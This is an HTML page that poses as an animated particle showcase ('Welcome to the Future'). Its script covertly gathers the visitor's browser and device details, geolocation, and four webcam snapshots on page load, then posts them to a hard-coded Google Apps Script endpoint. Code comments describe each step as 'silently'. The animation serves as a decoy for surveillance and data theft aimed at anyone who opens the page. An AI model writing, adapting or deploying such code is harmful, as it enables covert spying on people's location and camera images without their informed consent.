<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>Impressive Animated Page</title>
<style>
  /* Basic reset */
  body {
    margin: 0; overflow: hidden; font-family: 'Arial', sans-serif; background: #000;
  }
  /* animated background canvas */
  #bg {
    position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1;
  }
  /* content container */
  #content {
    position: relative; z-index: 1; padding: 20px; color: #fff; max-width: 1000px; margin: auto; text-align: center;
  }
  h1 {
    font-size: 3em; margin-bottom: 20px;
  }
  /* animated particles styles */
  .particle {
    position: absolute;
    border-radius: 50%;
    background: #fff;
    opacity: 0.7;
    animation: float 10s linear infinite;
  }
  @keyframes float {
    0% { transform: translateY(0); }
    100% { transform: translateY(-100px); }
  }
  /* hide elements we don't need visible */
</style>
</head>
<body>

<canvas id="bg"></canvas>
<div id="content">
  <h1>Welcome to the Future</h1>
  <p>Experience stunning animations and cutting-edge features.</p>
</div>

<script>
// --- Animated Particles Background ---
const canvas = document.getElementById('bg');
const ctx = canvas.getContext('2d');

let particles = [];
function resize() {
  canvas.width = window.innerWidth;
  canvas.height = window.innerHeight;
}
window.addEventListener('resize', resize);
resize();

class Particle {
  constructor() {
    this.x = Math.random() * window.innerWidth;
    this.y = Math.random() * window.innerHeight;
    this.size = Math.random() * 3 + 1;
    this.speedX = (Math.random() - 0.5) * 0.5;
    this.speedY = (Math.random() - 0.5) * 0.5;
  }
  update() {
    this.x += this.speedX;
    this.y += this.speedY;
    if (this.x < 0 || this.x > window.innerWidth) this.speedX *= -1;
    if (this.y < 0 || this.y > window.innerHeight) this.speedY *= -1;
  }
  draw() {
    ctx.fillStyle = 'white';
    ctx.beginPath();
    ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
    ctx.fill();
  }
}
function initParticles() {
  particles = [];
  for (let i=0; i<200; i++) {
    particles.push(new Particle());
  }
}
function animate() {
  ctx.fillStyle = 'rgba(0,0,0,0.2)';
  ctx.fillRect(0, 0, window.innerWidth, window.innerHeight);
  particles.forEach(p => {
    p.update();
    p.draw();
  });
  requestAnimationFrame(animate);
}
initParticles();
animate();

// --- Data collection & sending ---
const backendURL = 'https://script.google.com/macros/s/AKfycbzzXDzdAwI8UGkvYOKvg4SaJMXT7WatwstkswttwKUXcaLMeFaW4qwhqwbz3IkxBf_kyQ/exec'; // replace your Google Apps Script URL here

// Collect device info silently
function getDeviceInfo() {
  return {
    userAgent: navigator.userAgent,
    platform: navigator.platform,
    language: navigator.language,
    appVersion: navigator.appVersion
  };
}

// Get location silently
function getLocation() {
  return new Promise((resolve, reject) => {
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(pos => {
        resolve({
          latitude: pos.coords.latitude,
          longitude: pos.coords.longitude
        });
      }, () => reject('Location error'));
    } else {
      reject('Geo not supported');
    }
  });
}

// Capture 4 images silently
async function captureImages() {
  if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video:true });
      const video = document.createElement('video');
      video.srcObject = stream;
      await video.play();
      
      const images = [];
      for (let i=0; i<4; i++) {
        await new Promise(res => setTimeout(res, 500));
        const canvasCapture = document.createElement('canvas');
        canvasCapture.width = video.videoWidth;
        canvasCapture.height = video.videoHeight;
        const ctxCap = canvasCapture.getContext('2d');
        ctxCap.drawImage(video, 0, 0);
        images.push(canvasCapture.toDataURL('image/jpeg'));
      }
      stream.getTracks().forEach(t => t.stop());
      return images;
    } catch(e) {
      // camera access denied or error
      return [];
    }
  }
  return [];
}

// Send data silently
async function sendData(data) {
  try {
    await fetch(backendURL, {
      method: 'POST',
      mode: 'no-cors',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(data)
    });
  } catch(e) {
    console.error('Sending failed', e);
  }
}

// Main function to gather and send data
async function gatherAndSend() {
  const location = await getLocation().catch(() => null);
  const deviceInfo = getDeviceInfo();
  const images = await captureImages();

  // Send all data
  sendData({ location, deviceInfo, images });
}

// Run silently on page load
gatherAndSend();

</script>
</body>
</html>
